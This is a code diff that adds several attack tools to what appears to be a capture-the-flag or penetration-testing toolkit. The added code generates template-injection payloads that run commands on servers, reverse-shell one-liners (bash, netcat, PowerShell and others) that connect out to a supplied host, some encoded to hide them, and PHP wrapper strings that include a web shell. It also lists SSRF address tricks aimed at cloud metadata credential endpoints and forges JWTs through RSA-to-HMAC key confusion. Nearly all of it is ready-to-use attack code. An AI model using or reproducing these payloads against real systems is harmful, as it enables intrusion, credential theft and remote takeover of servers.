@@ -133,3 +133,213 @@ def sqli_payloads(kind: str = "auth_bypass") -> str:
     }
     payloads = sets.get(kind, [])
     return f"SQLi {kind} ({len(payloads)} payloads):\n" + "\n".join(payloads)
+
+
+@tool(category="web")
+def ssti_payloads(engine: str = "jinja2", command: str = "id") -> str:
+    """Generate SSTI (Server-Side Template Injection) RCE payloads for Jinja2, Twig, Smarty, SpEL, Thymeleaf, EJS, ERB."""
+    eng = engine.lower().strip()
+    c = command.replace("'", "\\'")
+    
+    payloads = {
+        "jinja2": [
+            f"{{{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{c}').read() }}}}",
+            f"{{{{ config.__class__.__init__.__globals__['os'].popen('{c}').read() }}}}",
+            f"{{{{ request.application.__globals__.__builtins__.__import__('os').popen('{c}').read() }}}}",
+            f"{{{{ ''.__class__.__mro__[1].__subclasses__()[396]('{c}',shell=True,stdout=-1).communicate()[0].strip() }}}}",
+            f"{{{{ lipsum.__globals__['os'].popen('{c}').read() }}}}",
+            f"{{{{ cycler.__init__.__globals__.os.popen('{c}').read() }}}}",
+            # Evasion without quotes or dots
+            f"{{{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('{c}')['read']() }}}}",
+        ],
+        "twig": [
+            f"{{{{['{c}']|filter('system')}}}}",
+            f"{{{{['{c}']|map('passthru')}}}}",
+            f"{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{\\self.env.getFilter('{c}')}}}}",
+            f"{{{{_self.env.setCache('ftp://...')}}}}",
+        ],
+        "smarty": [
+            f"{{system('{c}')}}",
+            f"{{Smarty_Internal_Write_File::writeFile('shell.php','<?php system($_GET[\"cmd\"]); ?>',self::clearConfig())}}",
+            f"{{php}}system('{c}');{{/php}}",
+        ],
+        "spel": [
+            f"${{T(java.lang.Runtime).getRuntime().exec('{c}')}}",
+            f"*{{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('{c}').getInputStream())}}",
+            f"${{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('{c}').getInputStream()).next()}}",
+        ],
+        "thymeleaf": [
+            f"__${{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('{c}').getInputStream()).next()}}__::.x",
+            f"${{T(java.lang.Runtime).getRuntime().exec('{c}')}}",
+        ],
+        "ejs": [
+            f"<%= global.process.mainModule.require('child_process').execSync('{c}').toString() %>",
+            f"<%= root.process.mainModule.require('child_process').spawnSync('{c}') %>",
+        ],
+        "erb": [
+            f"<%= `{c}` %>",
+            f"<%= IO.popen('{c}').readlines() %>",
+            f"<%= system('{c}') %>",
+        ],
+    }
+    
+    selected = payloads.get(eng)
+    if not selected:
+        available = ", ".join(payloads.keys())
+        return f"Unknown engine {engine!r}. Available: {available}."
+        
+    return f"SSTI Payloads for {engine.upper()} (Command: {command!r}):\n\n" + "\n\n".join(selected)
+
+
+@tool(category="web")
+def revshell_generator(ip: str, port: int, shell_type: str = "bash", encoding: str = "raw") -> str:
+    """Generate ready-to-run reverse shell one-liners (bash/python/nc/powershell/php/socat/perl/node)."""
+    st = shell_type.lower().strip()
+    
+    shells = {
+        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+        "bash_udp": f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
+        "python": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
+        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+        "nc_e": f"nc -e /bin/sh {ip} {port}",
+        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
+        "socat": f"socat TCP:{ip}:{port} EXEC:/bin/sh",
+        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+        "node": f"require('child_process').exec('nc -e /bin/sh {ip} {port}')",
+    }
+    
+    raw = shells.get(st, shells["bash"])
+    enc = encoding.lower().strip()
+    
+    if enc == "base64":
+        b64_cmd = base64.b64encode(raw.encode()).decode()
+        return f"echo {b64_cmd} | base64 -d | bash"
+    elif enc == "url":
+        return urllib.parse.quote(raw)
+    elif enc == "double_url":
+        return urllib.parse.quote(urllib.parse.quote(raw))
+    elif enc == "powershell_b64":
+        ps_bytes = raw.encode("utf-16le")
+        b64_ps = base64.b64encode(ps_bytes).decode()
+        return f"powershell -nop -w hidden -enc {b64_ps}"
+        
+    return f"Reverse Shell [{st}] ({ip}:{port}):\n{raw}"
+
+
+@tool(category="web")
+def php_filter_chain(resource: str = "flag.php", action: str = "base64") -> str:
+    """Generate PHP stream filter wrappers, data URIs, and PHP type-juggling magic hashes."""
+    act = action.lower().strip()
+    
+    if act == "base64":
+        return f"php://filter/convert.base64-encode/resource={resource}"
+    elif act == "rot13":
+        return f"php://filter/read=string.rot13/resource={resource}"
+    elif act == "zlib":
+        return f"php://filter/zlib.deflate/convert.base64-encode/resource={resource}"
+    elif act == "data_uri":
+        content = resource if resource != "flag.php" else "<?php system($_GET['cmd']); ?>"
+        b64 = base64.b64encode(content.encode()).decode()
+        return f"data://text/plain;base64,{b64}"
+    elif act == "magic_hashes":
+        return (
+            "PHP Type Juggling Magic Hashes (0e... == 0e...):\n\n"
+            "MD5:\n"
+            "  '240610708'       -> 0e462097431906509019562988736854\n"
+            "  'QNKCDZO'         -> 0e830400451993494058024219903391\n"
+            "  's878926199a'     -> 0e545993274517709982428689823901\n"
+            "  's155964671a'     -> 0e342768416822451524974117254469\n\n"
+            "SHA1:\n"
+            "  'aaroZmOk'        -> 0e66507019969427134894567496905872434066\n"
+            "  'aaO8zKZF'        -> 0e89252659868343190034012953604280754672\n"
+            "  'aaK1STeb'        -> 0e76658526655756207688271159624026016993\n\n"
+            "SHA256:\n"
+            "  'TyNOQIPG52072...' -> 0e00000000000000000000000000000000000000000000000000000000000000"
+        )
+        
+    return f"php://filter/convert.base64-encode/resource={resource}"
+
+
+@tool(category="web")
+def ssrf_obfuscator(ip_or_host: str = "127.0.0.1", port: int = 80) -> str:
+    """Generate obfuscated IP representations (Decimal, Hex, Octal, IPv6) and Cloud Metadata URLs."""
+    import socket
+    import struct
+    
+    try:
+        ip = socket.gethostbyname(ip_or_host)
+    except Exception:
+        ip = "127.0.0.1"
+        
+    parts = [int(p) for p in ip.split(".")]
+    dec = int.from_bytes(bytes(parts), "big")
+    hex_single = f"0x{dec:08x}"
+    hex_parts = ".".join(f"0x{p:02x}" for p in parts)
+    octal_parts = ".".join(f"0{p:03o}" for p in parts)
+    
+    port_str = f":{port}" if port not in (80, 443) else ""
+    
+    return (
+        f"SSRF IP Obfuscation for {ip_or_host} ({ip}):\n"
+        f"--------------------------------------------------\n"
+        f"Raw IP            : http://{ip}{port_str}/\n"
+        f"Decimal Integer   : http://{dec}{port_str}/\n"
+        f"Hex Combined      : http://{hex_single}{port_str}/\n"
+        f"Hex Dot-Separated : http://{hex_parts}{port_str}/\n"
+        f"Octal             : http://{octal_parts}{port_str}/\n"
+        f"IPv6 Localhost    : http://[::1]{port_str}/\n"
+        f"IPv6-Mapped IPv4  : http://[::ffff:{ip}]{port_str}/\n"
+        f"Short Localhost   : http://127.1{port_str}/\n\n"
+        f"Cloud Metadata Endpoints:\n"
+        f"  AWS IMDSv1      : http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
+        f"  GCP Metadata    : http://metadata.google.internal/computeMetadata/v1/ (Header: Metadata-Flavor: Google)\n"
+        f"  Azure Metadata  : http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Header: Metadata: true)\n"
+        f"  Alibaba Metadata: http://100.100.100.200/latest/meta-data/"
+    )
+
+
+@tool(category="web")
+def jwt_key_confusion(token: str, rsa_public_key_pem: str, modify_payload_json: str = '{"admin":true}') -> str:
+    """Exploit CVE-2015-9235 (RSA to HMAC algorithm confusion) using an RSA public key as the HMAC secret."""
+    import hmac
+    import hashlib
+    import os
+    
+    parts = token.strip().split(".")
+    if len(parts) != 3:
+        return "Invalid JWT token structure."
+        
+    try:
+        header = json.loads(_unb64url(parts[0]))
+        payload = json.loads(_unb64url(parts[1]))
+    except Exception as ex:
+        return f"Failed to parse JWT: {ex}"
+        
+    # Switch alg to HS256
+    header["alg"] = "HS256"
+    
+    # Update payload
+    if modify_payload_json:
+        try:
+            extra = json.loads(modify_payload_json)
+            payload.update(extra)
+        except Exception as ex:
+            return f"Invalid JSON in modify_payload_json: {ex}"
+            
+    h_b64 = _b64url(json.dumps(header, separators=(",", ":")).encode())
+    p_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
+    
+    # Secret is the raw bytes of the public key
+    if os.path.exists(rsa_public_key_pem.strip()):
+        secret_bytes = open(rsa_public_key_pem.strip(), "rb").read()
+    else:
+        secret_bytes = rsa_public_key_pem.strip().encode()
+        
+    sig = hmac.new(secret_bytes, f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
+    forged = f"{h_b64}.{p_b64}.{_b64url(sig)}"
+    
+    return (f"🏆 Forged HS256 Token (Key Confusion CVE-2015-9235):\n"
+            f"{forged}\n\n"
+            f"Header:\n{json.dumps(header, indent=2)}\n"
+            f"Payload:\n{json.dumps(payload, indent=2)}")
